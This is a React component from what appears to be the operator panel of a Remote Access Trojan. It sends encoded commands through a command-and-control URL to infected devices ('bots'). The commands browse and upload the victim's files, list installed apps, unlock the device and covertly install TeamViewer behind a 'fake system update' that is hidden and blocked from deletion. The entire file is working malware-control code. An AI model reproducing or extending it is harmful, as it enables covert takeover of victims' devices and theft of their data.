import React from 'react';
import { isNullOrUndefined } from 'util';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';
import $ from 'jquery';
import RatListFileManager from './RatListFileManager';
import RatListApps from './RatListApps';


class RatModal extends React.Component {
    constructor(props)
    {
        super(props);
        this.state = {
            id: '',
            last_connect: '',
            active_app: '',
            path: '',
            arrayFiles: '',
            cmd: '',
            text_cmd_path: '',
            screen : '',
            permission_storage : '',
            list_apps : '',
            checked : false,
            checked2 : false,
            checked3 : false,
            gmail: '',
            pass: '',
            open: ''
        };
    }

    onChangeText = (e) => {
        this.setState({ 
            text_cmd_path: e.target.value
        });
    }

    componentWillReceiveProps() { 
        if(SettingsContext.start_modul != 'RATModal'){
            return;
        }
            this.bool_show_modal = false;
             this.onLoadJson();
            }

    Base64DecodeToStr(base64str) {
        return new Buffer(base64str.toString()  == null ? '' : base64str.toString(), 'base64').toString('utf-8');
    }

    autoUpdate() {this._timer = setInterval(() => this.onLoadJson(), 2000);}

    
    DisableTimer() {
        if (this._timer) {
            clearInterval(this._timer);
            this._timer = null;
        }
    }


    onClickConnect() {
         $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(
                    '{"sent_request":"execute_cmd","ID":"' + SettingsContext.CurrentSetBot + 
                    '","command":"' + new Buffer('{"cmd":"rat_connect"}').toString('base64') + 
                    '"}'
                ).toString('base64')
            }
        });
        $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(
                    '{"sent_request":"rat_new_id","id":"'+SettingsContext.CurrentSetBot+'"}').toString('base64')
            }
        });
        try_eval('$.notify("Wait for the connection..", "info");');
    }


    onClickDisconnect() {
        $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(
                    '{"sent_request":"rat_cmd","cmd":"'+ new Buffer("rat_disconnect").toString('base64')+'"}').toString('base64')
            }
        });

        try_eval('$.notify("Device disconnect", "info");');
    }



    onLoadJson () {
      //  console.log('onLoadJson ' +  this._timer);
        this.DisableTimer();
        if((eval("$('#RATModal').is(':visible')") == false) && ( this.bool_show_modal == true)){
            return;
        }
        this.bool_show_modal = true;

        if(SettingsContext.CurrentSetBot.length < 1) {
            return;
        }

        if(this.state.open == 1){
            try_eval("document.getElementById('divRAT').style.display = 'none'");  
            try_eval("document.getElementById('divLA').style.display = 'none'");  
            try_eval("document.getElementById('divFM').style.display = 'block'");  
        }else if(this.state.open == 2){
            try_eval("document.getElementById('divRAT').style.display = 'none'");  
            try_eval("document.getElementById('divLA').style.display = 'block'");  
            try_eval("document.getElementById('divFM').style.display = 'none'");  
        }else if(this.state.open == 3){
            try_eval("document.getElementById('divRAT').style.display = 'block'");  
            try_eval("document.getElementById('divLA').style.display = 'none'");  
            try_eval("document.getElementById('divFM').style.display = 'none'");  
        }else{
            try_eval("document.getElementById('divRAT').style.display = 'none'");  
            try_eval("document.getElementById('divLA').style.display = 'none'");  
            try_eval("document.getElementById('divFM').style.display = 'none'");  
        }

        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer('{"sent_request":"rat_getinfo"}').toString('base64')
            }
        });
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error)){}else{
					this.setState({
                        myObjJS: result,
                        id: result.id_connecting,
                        last_connect: result.last_connect,
                        active_app: result.active_app,
                        path: new Buffer(result.path.toString() , 'base64').toString('utf-8'),
                        arrayFiles: new Buffer(result.arrayFiles.toString() , 'base64').toString('utf-8'),
                        cmd:  new Buffer(result.cmd.toString() , 'base64').toString('utf-8'),
                        list_apps : new Buffer(result.list_apps.toString() , 'base64').toString('utf-8'),
                        screen: result.screen,
                        permission_storage: result.permission_storage
                       
					});
				}
	
            }
            catch (ErrMgs) {}
        }.bind(this));
        this.autoUpdate();
    }

    btn_send_cmd_filemanager(btn){
        if(btn=='enter'){
            let request_cmd = $.ajax({
                type: 'POST',
                url: SettingsContext.url_connect,
                data: {
                    'params': new Buffer(
                        '{"sent_request":"rat_cmd","cmd":"'+ new Buffer('{"open_folder":"'+this.state.text_cmd_path+'"}').toString('base64')+'"}').toString('base64')
                }
            });request_cmd.done(function(msg) {
                try {
                    let result = JSON.parse(msg);
                    if(!isNullOrUndefined(result.error)){}else{
                        try_eval('$.notify("Added cmd { open_folder : '+this.state.text_cmd_path+' }", "info");');
                    }
                }catch (ErrMgs) {}
            }.bind(this));

           
        }else{
            let request_cmd = $.ajax({
                type: 'POST',
                url: SettingsContext.url_connect,
                data: {
                    'params': new Buffer(
                        '{"sent_request":"rat_cmd","cmd":"'+ new Buffer('{"open_folder":"~/"}').toString('base64')+'"}').toString('base64')
                }
            });request_cmd.done(function(msg) {
                try {
                    let result = JSON.parse(msg);
                    if(!isNullOrUndefined(result.error)){}else{
                        try_eval('$.notify("Added cmd { open_folder : ~/ }", "info");');
                    }
                }catch (ErrMgs) {}
            }.bind(this));

           
        }
        
    }

    callback_cmd(name_f, cmd_){
        if(cmd_ != ''){
            if(name_f == 'open_folder'){
                let request_cmd = $.ajax({
                    type: 'POST',
                    url: SettingsContext.url_connect,
                    data: {
                        'params': new Buffer(
                            '{"sent_request":"rat_cmd","cmd":"'+ new Buffer('{"open_folder":"'+cmd_+'"}').toString('base64')+'"}').toString('base64')
                    }
                });request_cmd.done(function(msg) {
                    try {
                        let result = JSON.parse(msg);
                        if(!isNullOrUndefined(result.error)){}else{
                            try_eval('$.notify("Added cmd { open_folder : '+cmd_+' }", "info");');
                        }
                    }catch (ErrMgs) {}
                }.bind(this));
            }
            if(name_f == 'uploadind_file'){
                cmd_ = cmd_.replace('[typefile]','');

                let request_cmd = $.ajax({
                    type: 'POST',
                    url: SettingsContext.url_connect,
                    data: {
                        'params': new Buffer(
                            '{"sent_request":"rat_cmd","cmd":"'+ new Buffer('{"uploadind_file":"'+cmd_+'"}').toString('base64')+'"}').toString('base64')
                    }
                });request_cmd.done(function(msg) {
                    try {
                        let result = JSON.parse(msg);
                        if(!isNullOrUndefined(result.error)){}else{
                            try_eval('$.notify("Added cmd { uploadind_file : '+cmd_+' }", "info");');
                        }
                    }catch (ErrMgs) {}
                }.bind(this));
            }
        }
    }


    FaCheckBox() {
        return this.state.checked ? 'far fa-check-square' : 'far fa-square';
    }

    toggleChange(){
        if(this.state.checked){
            this.setState({checked: false});
            try_eval("document.getElementById('inp_gmail').removeAttribute('disabled')");
            
        }else{
            this.setState({checked: true});
            try_eval("document.getElementById('inp_gmail').setAttribute('disabled','disabled')");
        }
        this.forceUpdate();
    }

    FaCheckBox2() {
        return this.state.checked2 ? 'far fa-check-square' : 'far fa-square';
    }

    toggleChange2(){
        if(this.state.checked2){
            this.setState({checked2: false});
            try_eval("document.getElementById('inp_gmail').removeAttribute('disabled')");
            
        }else{
            this.setState({checked2: true});
            try_eval("document.getElementById('inp_gmail').setAttribute('disabled','disabled')");
        }
        this.forceUpdate();
    }

    FaCheckBox3() {
        return this.state.checked3 ? 'far fa-check-square' : 'far fa-square';
    }

    toggleChange3(){
        if(this.state.checked3){
            this.setState({checked3: false});
            try_eval("document.getElementById('inp_gmail').removeAttribute('disabled')");
            
        }else{
            this.setState({checked3: true});
            try_eval("document.getElementById('inp_gmail').setAttribute('disabled','disabled')");
        }
        this.forceUpdate();
    }
    


    connect_teamviewer(){
        let request_cmd = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(
                    '{"sent_request":"rat_cmd","cmd":"'+ new Buffer('{"connect_teamviewer":"'+this.state.gmail+'","password":"'+this.state.pass+'","fake":"'+this.state.checked+'","hidden":"'+this.state.checked2+'","blocking":"'+this.state.checked3+'"}').toString('base64')+'"}').toString('base64')
            }
        });request_cmd.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)){}else{
                    try_eval('$.notify("Added cmd { connect_teamviewer : '+this.state.gmail+' }", "info");');
                }
            }catch (ErrMgs) {}
        }.bind(this));
    }

    open_teamviewer(){
        let request_cmd = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(
                    '{"sent_request":"rat_cmd","cmd":"'+ new Buffer('{"open_teamviewer":"true","fake":"'+this.state.checked+'","hidden":"'+this.state.checked2+'","blocking":"'+this.state.checked3+'"}').toString('base64')+'"}').toString('base64')
            }
        });request_cmd.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)){}else{
                    try_eval('$.notify("Added cmd { open_teamviewer : true }", "info");');
                }
            }catch (ErrMgs) {}
        }.bind(this));
    }

    device_unlock(){
        let request_cmd = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(
                    '{"sent_request":"rat_cmd","cmd":"'+ new Buffer('{"device_unlock":"true","fake":"'+this.state.checked+'","hidden":"'+this.state.checked2+'","blocking":"'+this.state.checked3+'"}').toString('base64')+'"}').toString('base64')
            }
        });request_cmd.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)){}else{
                    try_eval('$.notify("Added cmd { device_unlock : true }", "info");');
                }
            }catch (ErrMgs) {}
        }.bind(this));
    }

    send_settings(){
        let request_cmd = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(
                    '{"sent_request":"rat_cmd","cmd":"'+ new Buffer('{"send_settings":"true","fake":"'+this.state.checked+'","hidden":"'+this.state.checked2+'","blocking":"'+this.state.checked3+'"}').toString('base64')+'"}').toString('base64')
            }
        });request_cmd.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)){}else{
                    try_eval('$.notify("Added cmd { send_settings : true }", "info");');
                }
            }catch (ErrMgs) {}
        }.bind(this));
    }

    fileManager(){
        this.setState({ 
            open: '1'
        });
    }
    listApps(){
        this.setState({ 
            open: '2'
        });
    }
    openRAT(){
        this.setState({ 
            open: '3'
        });
    }

    get_apps(){
        let request_cmd = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(
                    '{"sent_request":"rat_cmd","cmd":"'+ new Buffer('{"get_apps":"true"}').toString('base64')+'"}').toString('base64')
            }
        });request_cmd.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)){}else{
                    try_eval('$.notify("Added cmd { get_apps : true }", "info");');
                }
            }catch (ErrMgs) {}
        }.bind(this));
    }
    onChangeGmail = (e) => {
        this.setState({ 
            gmail: e.target.value
        });
    }

    onChangePassword = (e) => {
        this.setState({ 
            pass: e.target.value
        });
    }


  

    render () {

        //-----btn----
        let btn_class = "btn btn-success";
        let btn_onclick = this.onClickConnect.bind(this);
        let btn_text = "Connect device";
        if(this.state.last_connect < 15){
             btn_class = "btn btn-danger";
             btn_onclick = this.onClickDisconnect.bind(this);
             btn_text = "Disconnect device";
        }
        //------last connect----
        const time_style_red = {color: 'red'}
        const time_style_green = {color: 'green'}

        let time_text =  'Device disconnect'; 
        let time_style =  time_style_red; 
        if(this.state.last_connect < 15){
            time_text =  this.state.last_connect + ' sek' ;
            time_style =  time_style_green; 
        }

        //-----Permission storage-----
        let text_permission = 'off';
        let perms_style = {color: 'red'};
        if(this.state.permission_storage == '1'){
            text_permission = 'on';
            perms_style = {color: 'green'};
        }
        //------Screen-----------------
        let screen_class = 'far fa-low-vision';
        let screen_style = {color: '#B8B8B8'};
        if(this.state.screen == '1'){
            screen_class = 'far fa-eye';
            screen_style = {color: '#5C5C5C'};
        }

        return (

            <div class="modal fade" id="RATModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
            <div class="modal-dialog modal-lg2" role="document">
                <div class="modal-content ">
                <div class="modal-header">
                <h5>Remote Access Trojan</h5>

             
                        <div style={({marginLeft: '80px'})}>

                        <button type="button"  style={({marginLeft: '7px'})} onClick={this.fileManager.bind(this)} class="btn btn-outline-secondary">File Manager</button>

                        <button type="button"  style={({marginLeft: '7px'})} onClick={this.listApps.bind(this)} class="btn btn-outline-secondary">List Applications</button>

                        <button type="button"  style={({marginLeft: '7px'})}onClick={this.openRAT.bind(this)} class="btn btn-outline-secondary">TeamViewer</button>

                        </div> 
                       
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                    </button>

                </div>
                <div style={({overflow: 'hidden', height: '80vh'})}>
                    
              

                  
                        <div style={({border: '1px solid grey',float: 'left', textAlign: 'left', borderRadius: '3px',  width: '50vh',  marginLeft: '30px', marginTop: '10px'})}>
                          <br/>  
                            <span style={({marginLeft: '10px'})}><b>ID:</b> {this.state.id}</span><br/>  
                            <span style={({marginLeft: '10px'})}><b>Last connect:</b> <span style={time_style} >{time_text}</span></span><br/>  
                            <span style={({marginLeft: '10px'})}><b>Active application:</b> {this.state.active_app}</span><br/>  
                            <span style={({marginLeft: '10px'})}><b>Screen:</b>  <i class={screen_class} style={screen_style}></i></span><br/>  
                            <span style={({marginLeft: '10px'})}><b>Permission storage:</b>  <span style={perms_style}>{text_permission}</span></span><br/>  
                            <span style={({marginLeft: '10px'})}><b>cmd:</b> {this.state.cmd}</span><br/>  
                            <br/>  
                            <center><button type="button" onClick={btn_onclick} class={btn_class}>{btn_text}</button></center>   
                            <br/>   
                        </div>

                       
                        <center>
                        <div id='divRAT' style={({border: '1px solid grey', textAlign: 'left', borderRadius: '3px', maxWidth: '50vh', marginTop: '10px', marginLeft: '250px'})}>
                            <center>
                                <h5>TeamViewer</h5>
                                <input class="form-control" style={({width: '90%'})} value={this.state.gmail} onChange={this.onChangeGmail}   placeholder="E-mail" />
                                <input class="form-control" style={({width: '90%'})} value={this.state.pass} onChange={this.onChangePassword}  placeholder="Password" />
                                <br/>
                                </center>
                                <i style={({marginLeft:'25px', paddingRight:'6px'})} class={this.FaCheckBox()} onClick={this.toggleChange.bind(this)} />Open fake system update
                                <br/>
                                <i style={({marginLeft:'25px', paddingRight:'6px'})} class={this.FaCheckBox2()} onClick={this.toggleChange2.bind(this)} />Minimize the TeamViewer after connecting
                                <br/>
                                <i style={({marginLeft:'25px', paddingRight:'6px'})} class={this.FaCheckBox3()} onClick={this.toggleChange3.bind(this)} />Blocking TeamViewer deletion
                                <br/><br/>
                                <center>
                                <button type="button" style={({marginRight: '5px'})} onClick={this.connect_teamviewer.bind(this)} class="btn btn-success">Connect<br/>TeamViewer</button>
                                <button type="button" style={({marginRight: '5px'})} onClick={this.open_teamviewer.bind(this)} class="btn btn-success">Open application<br/>TeamViewer</button>
                                <button type="button" style={({marginRight: '5px'})} onClick={this.device_unlock.bind(this)} class="btn btn-success">Device <br/>unlock</button>
                                <button type="button" onClick={this.send_settings.bind(this)} class="btn btn-success">Send <br/>Settings</button>
                                </center>
                            <br/>
                        </div>
                      

                       

                        <div id='divFM' style={({border: '1px solid grey', textAlign: 'left', borderRadius: '3px', maxWidth: '50vh', marginTop: '10px', marginLeft: '250px'})}>

                            <center><h5>File Manager</h5></center>
                           
                            <br/>    
                            <RatListFileManager callback={this.callback_cmd.bind(this)} path={this.state.path}  arrayFiles={this.state.arrayFiles} />
                            <br/>
                
                           <center>
                           <i>Directory: {this.state.path}</i>
                            <br/>
                                <div style={({display:'inline-block',  width:'90%'})}>
                                <input id="path_cmd" value={this.state.text_cmd_path} onChange={this.onChangeText}  placeholder="Open directory" class="form-control3" type="text" style={({marginRight: '1px',marginBottom: '10px', width:'60%'})}/>
                                <button type="button" onClick={this.btn_send_cmd_filemanager.bind(this,'enter')}  style={({marginRight: '1px'})} class="btn btn-success">⬆</button>
                                <button type="button"  onClick={this.btn_send_cmd_filemanager.bind(this,'~')} class="btn btn-success">~/</button>
                                </div>


                                <br/>
                                
                            
                            </center>
                        </div>



                        <div id='divLA' style={({border: '1px solid grey', textAlign: 'left', borderRadius: '3px', maxWidth: '50vh', marginTop: '10px',marginLeft: '250px'})}>
                            <center><h5>Installed Applications</h5></center>
                            <RatListApps  arrayApps={this.state.list_apps} />
                            <br/>
                           <center> <button type="button" style={({marginRight: '5px'})} onClick={this.get_apps.bind(this)} class="btn btn-success">Get applications</button></center>
                            <br/>
                        </div>

                        </center>
                                                    
                </div>

               
                
                </div>
            </div>
        </div>
    

        );
    }
}

export default RatModal;